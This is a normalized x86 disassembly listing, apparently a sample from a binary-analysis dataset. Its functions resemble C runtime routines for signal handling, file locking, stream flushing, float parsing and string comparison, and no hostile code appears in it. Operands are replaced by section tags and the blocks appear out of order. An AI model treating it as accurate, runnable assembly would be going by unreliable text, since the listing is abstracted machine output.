push eax
call sub_4193fe
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_418640
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
dec eax
push ebx
push esi
dec eax
push edi
je r-xdata
mov ebx [ rw-data ]
mov edi rw-data
dec eax
dec eax
je r-xdata
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_413593
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_4187c2
mov edi eax
pop ecx
add edi 0x8
pop ecx
mov ebx [ edi ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x8
je r-xdata
cmp [ ebp - 0x4 ] ecx
je r-xdata
xor eax eax
push ebx
call sub_41373b
pop ecx
jmp r-xdata
cmp ebx 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov edx [ esi + 0x54 ]
cmp eax 0x8
mov [ ebp - 0x8 ] edx
mov [ esi + 0x54 ] ecx
jne r-xdata
cmp eax 0xb
je r-xdata
push 0x3
call sub_411442
push 0x1
call sub_41373b
pop ecx
sub eax 0x4
je r-xdata
mov [ edi ] ecx
mov edx [ esi + 0x58 ]
mov [ esi + 0x58 ] 0x8c
mov [ ebp - 0xc ] edx
cmp eax 0x4
jne r-xdata
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jne r-xdata
push 0x1
call sub_41373b
pop ecx
mov ecx [ rw-data ]
mov eax [ rw-data ]
add eax ecx
cmp ecx eax
jge r-xdata
cmp eax 0x8
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x1
call sub_4136da
mov esi [ ebp + 0x8 ]
pop ecx
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call ebx
cmp [ ebp + 0x8 ] 0xb
pop ecx
je r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x8
mov [ esi + 0x54 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x4
jne r-xdata
mov edx [ esi + 0x50 ]
add eax 0xc
and [ edx + eax - 0x4 ] 0x0
mov edx [ rw-data ]
mov edi [ rw-data ]
inc ecx
add edi edx
cmp ecx edi
jl r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
mov [ esi + 0x58 ] eax
sub_4187c2
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx + 0x4 ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax + 0x4 ] esi
je r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_4187ff
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_4129af
mov [ eax ] 0x9
call sub_4129b8
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_41887e
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
call sub_4129af
mov [ eax ] 0x9
call sub_4129b8
and [ eax ] 0x0
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 4 + 0x4 ] 0x1
lea eax [ ecx + eax * 4 ]
je r-xdata
mov eax [ eax ]
retn
sub_4188c0
mov eax [ esp + 0x4 ]
push ebx
mov ecx eax
and eax 0x1f
sar ecx 0x5
push esi
push edi
mov esi [ ecx * 4 + rw-data ]
lea ebx [ ecx * 4 + rw-data ]
lea edi [ eax + eax * 8 ]
shl edi 0x2
add esi edi
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
pop edi
pop esi
pop ebx
retn
push 0x11
call sub_4136da
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
push 0x11
call sub_41373b
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
sub_418941
push ebx
push edi
push 0x2
xor ebx ebx
call sub_4136da
pop ecx
push 0x3
pop edi
cmp [ rw-data ] edi
jle r-xdata
push 0x2
call sub_41373b
pop ecx
mov eax ebx
pop edi
pop ebx
retn
push esi
inc edi
cmp edi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov eax [ rw-data ]
mov esi edi
shl esi 0x2
mov eax [ esi + eax ]
test eax eax
je r-xdata
pop esi
cmp edi 0x14
jl r-xdata
push eax
call sub_4195b1
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_410cc6
mov eax [ rw-data ]
pop ecx
and [ esi + eax ] 0x0
inc ebx
sub_4189c2
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_4189f0
test eax eax
pop ecx
je r-xdata
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_41962e
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_4189f0
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_417926
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_418a55
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_4136da
xor esi esi
pop ecx
cmp [ rw-data ] esi
jle r-xdata
push 0x2
call sub_41373b
cmp [ esp + 0x14 ] 0x1
pop ecx
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
push eax
push esi
call sub_417c6e
mov eax [ rw-data ]
pop ecx
pop ecx
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_417cc0
pop ecx
pop ecx
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_4189c2
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_4189c2
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_418af9
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
xor eax eax
lea ecx [ edx + esi ]
cmp ecx edx
jb r-xdata
push 0x1
pop eax
cmp ecx esi
jae r-xdata
mov edx [ esp + 0x10 ]
pop esi
mov [ edx ] ecx
retn
sub_418b1a
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
push esi
push [ edi ]
push [ esi ]
call sub_418af9
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push [ edi + 0x4 ]
push [ eax ]
call sub_418af9
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push 0x1
push [ eax ]
call sub_418af9
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x8 ]
push [ eax ]
call sub_418af9
add esp 0xc
pop edi
pop esi
retn
inc [ esi + 0x8 ]
inc [ esi + 0x8 ]
sub_418b78
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ecx esi
add esi esi
mov [ eax ] esi
lea esi [ edi + edi ]
shr ecx 0x1f
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
mov [ eax + 0x4 ] esi
shr edx 0x1f
shl ecx 0x1
or ecx edx
pop edi
mov [ eax + 0x8 ] ecx
pop esi
retn
sub_418ba6
mov eax [ esp + 0x4 ]
push esi
push edi
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
mov esi edx
mov edi ecx
shl esi 0x1f
shr ecx 0x1
or ecx esi
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
shl edi 0x1f
shr ecx 0x1
shr edx 0x1
or ecx edi
pop edi
mov [ eax + 0x8 ] edx
mov [ eax ] ecx
pop esi
retn
sub_418bd3
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
cmp eax edx
push esi
mov [ ebp - 0x4 ] 0x404e
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
jbe r-xdata
cmp [ ebx + 0x8 ] edx
jne r-xdata
push edi
mov [ ebp + 0x10 ] eax
mov esi 0x8000
mov ecx [ ebx + 0x4 ]
mov eax ecx
shr eax 0x10
mov [ ebx + 0x8 ] eax
mov eax [ ebx ]
mov esi eax
shr esi 0x10
shl ecx 0x10
or esi ecx
shl eax 0x10
add [ ebp - 0x4 ] 0xfff0
mov [ ebx + 0x4 ] esi
mov [ ebx ] eax
jmp r-xdata
mov esi ebx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_418b78
push ebx
call sub_418b78
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_418b1a
push ebx
call sub_418b78
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
movsx eax [ eax ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_418b1a
add esp 0x1c
inc [ ebp + 0x8 ]
dec [ ebp + 0x10 ]
jne r-xdata
xor edx edx
pop edi
mov ax [ ebp - 0x4 ]
pop esi
mov [ ebx + 0xa ] ax
pop ebx
leave
retn
push ebx
call sub_418b78
add [ ebp - 0x4 ] 0xffff
pop ecx
jmp r-xdata
test [ ebx + 0x8 ] esi
jne r-xdata
sub_418c9a
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push 0x1
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp + 0x10 ] edi
inc edi
jmp r-xdata
cmp cl 0x9
je r-xdata
mov cl [ edi ]
cmp cl 0x20
je r-xdata
cmp cl 0xa
je r-xdata
cmp cl 0xd
jne r-xdata
push 0x4
pop esi
cmp eax 0xa
je r-xdata
jmp [ eax * 4 + jump_table_41913b ]
mov eax [ ebp + 0xc ]
cmp [ ebp - 0x10 ] 0x0
mov [ eax ] edi
je r-xdata
jmp r-xdata
cmp bl 0x31
jl r-xdata
cmp bl 0x31
mov [ ebp - 0x10 ] edx
jl r-xdata
cmp bl 0x31
jl r-xdata
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x24 ] edx
jne r-xdata
cmp [ rw-data ] edx
mov [ ebp - 0x24 ] edx
jle r-xdata
lea ecx [ edi - 0x2 ]
cmp bl 0x31
mov [ ebp + 0x10 ] ecx
jl r-xdata
mov [ ebp - 0x20 ] edx
cmp bl 0x31
jl r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x1
xor esi esi
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4 ] eax
jbe r-xdata
mov bl [ edi ]
inc edi
cmp eax 0xb
ja r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp bl 0x39
jg r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_4138b4
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
cmp [ rw-data ] edx
jle r-xdata
cmp bl 0x30
jne r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_4138b4
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl 0x31
jl r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp bl 0x30
jne r-xdata
cmp bl 0x39
jg r-xdata
push 0xa
dec edi
pop eax
movsx eax bl
lea ecx [ edi - 0x1 ]
sub eax 0x2b
mov [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_4138b4
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
or eax [ ebp - 0x28 ]
pop edi
mov [ ecx + 0x6 ] esi
mov [ ecx + 0x2 ] ebx
mov [ ecx + 0xa ] ax
mov eax [ ebp - 0x14 ]
pop esi
mov [ ecx ] dx
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ ebp - 0x45 ] 0x5
jl r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
push 0x5
jmp r-xdata
push 0x3
jmp r-xdata
mov eax esi
jmp r-xdata
cmp bl 0x2b
je r-xdata
cmp bl 0x30
jne r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_4138b4
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
dec [ ebp - 0x8 ]
mov bl [ edi ]
inc edi
jmp r-xdata
mov edi [ ebp + 0x10 ]
jmp r-xdata
mov eax esi
jmp r-xdata
test eax eax
je r-xdata
push 0x7
dec eax
dec eax
je r-xdata
push 0x9
dec edi
jmp r-xdata
cmp bl 0x39
jg r-xdata
cmp bl 0x30
jne r-xdata
jmp r-xdata
dec eax
dec eax
jne r-xdata
mov [ ebp - 0x1c ] esi
movsx ecx bl
lea eax [ esi + esi * 4 ]
lea esi [ ecx + eax * 2 - 0x30 ]
cmp esi 0x1450
jg r-xdata
test eax eax
je r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
jmp r-xdata
dec eax
cmp [ eax ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
dec eax
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebp - 0x45 ]
and [ ebp - 0x28 ] 0x0
push 0x2
pop eax
jmp r-xdata
dec eax
dec eax
je r-xdata
pop eax
jmp r-xdata
pop eax
dec edi
push 0xb
jmp r-xdata
cmp bl 0x2d
je r-xdata
mov eax edx
jmp r-xdata
cmp bl 0x2b
je r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
dec edi
jmp r-xdata
or [ ebp - 0x18 ] 0xffffffff
push 0x7
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
push 0x8
jmp r-xdata
mov edi ecx
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_4138b4
pop ecx
pop ecx
jmp r-xdata
mov esi 0x1451
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x5c ]
push [ ebp - 0x4 ]
push eax
call sub_418bd3
mov eax [ ebp - 0x1c ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x18 ] ecx
jge r-xdata
dec [ ebp - 0x4 ]
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
push 0x2
mov [ ebp - 0x28 ] 0x8000
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp bl 0x30
je r-xdata
cmp bl 0x2d
je r-xdata
cmp [ rw-data ] edx
jle r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
xor ebx ebx
mov eax 0x7fff
mov esi 0x80000000
xor edx edx
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
add eax [ ebp - 0x8 ]
cmp [ ebp - 0x20 ] ecx
jne r-xdata
neg eax
jmp r-xdata
cmp bl 0x43
jle r-xdata
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x1
cmp [ ebp - 0x24 ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp bl 0x45
jle r-xdata
cmp eax 0x1450
jle r-xdata
sub eax [ ebp + 0x1c ]
push 0x6
jmp r-xdata
cmp bl 0x63
jle r-xdata
cmp eax 0xffffebb0
jge r-xdata
mov [ ebp - 0x2c ] 0x1
cmp bl 0x65
jg r-xdata
push [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_4198e1
mov edx [ ebp - 0x40 ]
mov ebx [ ebp - 0x3e ]
mov esi [ ebp - 0x3a ]
mov eax [ ebp - 0x36 ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
sub_41916b
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov ecx eax
mov esi 0x7fff
and ecx 0x8000
and eax esi
test cx cx
push edi
mov [ ebp - 0x1c ] 0xcc
mov [ ebp - 0x1b ] 0xcc
mov [ ebp - 0x1a ] 0xcc
mov [ ebp - 0x19 ] 0xcc
mov [ ebp - 0x18 ] 0xcc
mov [ ebp - 0x17 ] 0xcc
mov [ ebp - 0x16 ] 0xcc
mov [ ebp - 0x15 ] 0xcc
mov [ ebp - 0x14 ] 0xcc
mov [ ebp - 0x13 ] 0xcc
mov [ ebp - 0x12 ] 0xfb
mov [ ebp - 0x11 ] 0x3f
mov [ ebp - 0x4 ] 0x1
mov edx eax
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx si
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp + 0xc ]
test dx dx
jne r-xdata
movzx eax dx
mov ecx edi
mov esi eax
shr ecx 0x18
imul eax eax 0x4d10
shr esi 0x8
and [ ebp - 0x10 ] 0x0
push 0x1
lea ecx [ esi + ecx * 2 ]
mov [ ebp - 0x6 ] dx
imul ecx ecx 0x4d
mov [ ebp - 0xa ] edi
lea esi [ ecx + eax - 0x134312f4 ]
mov eax [ ebp + 0x8 ]
sar esi 0x10
mov [ ebp - 0xe ] eax
movsx eax si
neg eax
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4198e1
add esp 0xc
cmp [ ebp - 0x6 ] 0x3fff
jb r-xdata
mov eax 0x80000000
mov [ ebx ] 0x1
cmp edi eax
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
test [ ebp + 0x18 ] 0x1
mov [ ebx ] si
je r-xdata
lea eax [ ebp - 0x1c ]
inc esi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4196c1
pop ecx
pop ecx
test edi 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov edi [ ebp + 0x14 ]
movsx eax si
add edi eax
test edi edi
jg r-xdata
test cx cx
je r-xdata
push r--data
jmp r-xdata
and [ ebx + 0x5 ] 0x0
push 0x1
pop eax
jmp r-xdata
movzx esi [ ebp - 0x6 ]
sub esi 0x3ffe
and [ ebp - 0x6 ] 0x0
mov [ ebp + 0x1c ] 0x8
push 0x15
pop edi
cmp edi 0x15
jle r-xdata
jmp r-xdata
cmp edi eax
jne r-xdata
cmp edi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_415bf0
pop ecx
mov [ ebx + 0x3 ] 0x6
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call sub_418b78
dec [ ebp + 0x1c ]
pop ecx
jne r-xdata
test esi esi
jge r-xdata
push r--data
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
lea ecx [ edi + 0x1 ]
lea eax [ ebx + 0x4 ]
test ecx ecx
mov [ ebp + 0x1c ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
push r--data
push r--data
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ eax - 0x1 ]
dec eax
dec eax
cmp cl 0x35
lea ecx [ ebx + 0x4 ]
jl r-xdata
mov [ ebp + 0x14 ] ecx
lea eax [ ebp - 0x10 ]
push eax
call sub_418ba6
dec esi
pop ecx
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_415bf0
pop ecx
mov [ ebx + 0x3 ] 0x5
pop ecx
cmp eax ecx
jb r-xdata
cmp eax ecx
jb r-xdata
lea esi [ ebp - 0x10 ]
lea edi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
movsd [ edi ] [ esi ]
call sub_418b78
lea eax [ ebp - 0x10 ]
push eax
call sub_418b78
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_418b1a
lea eax [ ebp - 0x10 ]
push eax
call sub_418b78
mov al [ ebp - 0x5 ]
mov ecx [ ebp + 0x1c ]
and [ ebp - 0x5 ] 0x0
add esp 0x14
add al 0x30
inc [ ebp + 0x1c ]
dec [ ebp + 0x14 ]
mov [ ecx ] al
jne r-xdata
mov eax [ ebp + 0x1c ]
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ecx ] 0x30
cmp [ eax ] 0x30
jne r-xdata
inc eax
inc [ ebx ]
cmp [ eax ] 0x39
jne r-xdata
cmp eax ecx
jae r-xdata
dec eax
jmp r-xdata
cmp eax ecx
jae r-xdata
mov [ eax ] 0x30
dec eax
jmp r-xdata
sub al bl
sub al 0x3
mov [ ebx + 0x3 ] al
movsx eax al
and [ eax + ebx + 0x4 ] 0x0
inc [ eax ]
sub_4193fe
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ rw-data ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push 0x1
push [ rw-data ]
call sub_41995d
add esp 0x1c
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
add eax 0xfffffffe
pop ebp
retn
mov eax 0x7fffffff
pop ebp
retn
sub_41943d
push ecx
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
xor edi edi
mov eax [ esi ]
cmp eax edi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push ebp
call sub_410b8c
cmp eax edi
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
push edi
push ebp
push eax
push 0xffffffff
push [ esi ]
push edi
push 0x1
call ebx
test eax eax
je r-xdata
push edi
push [ esp + 0x14 ]
call sub_419bda
mov eax [ esi + 0x4 ]
add esi 0x4
pop ecx
cmp eax edi
pop ecx
jne r-xdata
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0x1
call ebx
mov ebp eax
cmp ebp edi
je r-xdata
sub_4194b0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
[ rw-data ]
mov ebx ecx
push 0x13
call sub_4136da
mov [ esp ] 0x1
mov ecx ebx
push 0x0
jmp r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
pop eax
or eax eax
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_417f7a
mov ebx eax
add esp 0x4
call sub_417f7a
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov ebx ecx
push 0x13
call sub_41373b
add esp 0x4
mov ecx ebx
[ rw-data ]
jmp r-xdata
neg ecx
dec ecx
jne r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_4195b1
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
je r-xdata
push esi
call sub_417c3f
push esi
call sub_4195e2
push esi
mov edi eax
call sub_417c91
add esp 0xc
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
sub_4195e2
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x83
je r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
pop edi
pop esi
retn
push esi
call sub_4189f0
push esi
mov edi eax
call sub_419f00
push [ esi + 0x10 ]
call sub_419e20
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
